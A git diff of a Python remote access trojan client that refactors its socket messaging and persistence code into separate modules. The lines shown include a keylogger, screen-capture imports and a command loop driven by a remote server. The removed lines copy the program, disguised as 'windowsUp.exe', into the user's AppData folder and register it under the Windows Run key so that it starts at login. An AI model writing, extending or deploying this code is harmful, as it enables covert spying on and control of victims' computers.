@@ -19,72 +19,15 @@ import datetime
 import platform
 import random
 
-
-import keylog
 from PIL import ImageGrab
 
-
+sys.path.append("dependencies/")
+import communicator
+import keylog
 import cpuinfo 
+import persistance
 
-class communicator:
-    def __init__(self , sockLocal):
-        self.sockLocal = sockLocal 
-        self.packetLen = 0
-        self.clearMessage = ""
-        self.encodedMessage = ""
-        self.encoder = "utf-8"
-        
-    def calculateLenght(self , message):
-        self.encodedMessage = message.encode(self.encoder)
-        self.packetLen = len(self.encodedMessage)
-        return self.packetLen 
-    
-    
-    def send(self , mess ):
-        #print("DEBUG -> Message to send = " , mess)
-        self.sockLocal.send(str(self.calculateLenght(mess)).encode(self.encoder))
-        #print("DEBUG -> Packet Lenght = " , self.packetLen)
-        confirm = self.sockLocal.recv(16).decode(self.encoder)
-        #print("DEBUG -> Confirmation received -> " , confirm)
-        self.sockLocal.send(mess.encode(self.encoder))
-    
-    def receive(self):
-        #print("DEBUG ->  Preparing to receive a packet ")
-        lenght = int(self.sockLocal.recv(16).decode(self.encoder))
-        #print("DEBUG -> Packet lenght = " , lenght)
-        self.sockLocal.send("ACK".encode(self.encoder))
-        #print("DEBUG -> ACK sended ")
-        recv = self.sockLocal.recv(lenght).decode(self.encoder)
-        #print("DEBUG -> message Received = " , recv )
-        return recv 
-    
-    
-    def sendBytes(self , byte):
-        #self.sockLocal.send(str(len(byte)).encode(self.encoder))
-        #print("DEBUG -> len of file = " , len(byte))
-        #self.sockLocal.recv(16).decode(self.encoder)
-        #print("DEBUG -> ACK received ")
-        self.sockLocal.send(byte)
-        #print("DEBUG -> BYTES SENDED ")
-    
-    def receiveBytes(self , pathToStore):
-        #lenght = int(self.sockLocal.recv(16).decode(self.encoder))
-        #print("DEBUG -> Bytes to receive = " , lenght)
-        #self.sockLocal.send("ACK".encode(self.encoder))
-        #print("DEBUG -> ACK SENDED")
-        f = open(pathToStore , "wb")
-        data = b''
-        temp = b''
-        while( True):
-            temp = self.sockLocal.recv(1024)
-            f.write(temp)
-            if (len(temp) < 1024):
-                break
-        f.close()
-   
-        #recv = self.sockLocal.recv(lenght)
-        #print("DEBUG -> TOTAL BYTES RECEIVED  = " , len(data))
-        return data
+
 
 class clientServerExchanger:
     def __init__(self , port= 4242 , ip = "127.0.0.1" ):
@@ -95,14 +38,16 @@ class clientServerExchanger:
         self.command = "" 
         self.path = os.getcwd().replace("\\" , "/").strip("\n")
         self.programName = "windowsUp.exe"
+        
         self.keyloger = keylog.keylogger()
+        self.persistance = None
         
     def clientInitialize(self):
         
         print("[*] Trying to connect to -> " , self.ip ," on port -> " , self.port )
         self.socket.connect((self.ip , self.port))
         print("[+] Succesfully connected to the server")
-        self.communicator = communicator(self.socket)
+        self.communicator = communicator.communicator(self.socket)
         self.mainHandler()
         
         
@@ -263,37 +208,21 @@ class clientServerExchanger:
     def persistance(self , command):
         if not "win" in sys.platform:
             self.communicator.send("[-] Not windows platform can't setup persistance" )
-            return 
+            return
+        
+        if self.persistance == None :     
+               self.persistance = persistance.persistance(self.programPath , self.programName)
+
+                   
         if "install" in command : 
-            print("Installing persistance")
-            path = self.path
-            
-            userProfile = os.path.expanduser("~").replace("\\","/").strip("\n")
-            
-            
-            destination =  userProfile + "/AppData/LocalLow/" + self.programName            
-            try : 
-                if not os.path.exists(destination):
-                    shutil.copyfile(path +"/" +  self.programName , destination)
-                    
-                    destination = destination.replace("/" , "\\")
-                    destination = '"' + destination +'"'
-                    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER , "Software\Microsoft\Windows\CurrentVersion\Run" , 0, wreg.KEY_ALL_ACCESS)
-                    
-                    wreg.SetValueEx(key , self.programName.strip(".exe") , 0 , wreg.REG_SZ,destination)
-                    key.Close()
-                    self.communicator.send("[+] Persistance succesfully installed !!")
-                else :
-                    self.communicator.send("[*] Persistance already installed !!")
-            except Exception as e :
-                self.communicator.send("[-] An error appened during persistance installation -> " + e )
+            self.communicator.send(self.persistance.installPersistance())
         
         elif "remove" in command:
-            """
-            FAIRE UN FOCTNTION QUI ENLEVE LA CLE DU REGISTRE MAIS PAS LE EXE
-            """
-            pass
-    
+            self.communicator.send(self.persistance.removePersistance())
+        
+        else:
+            self.communicator.send("Command not understand")
+        
     def keylog(self, command):
         
         if "start" in command :
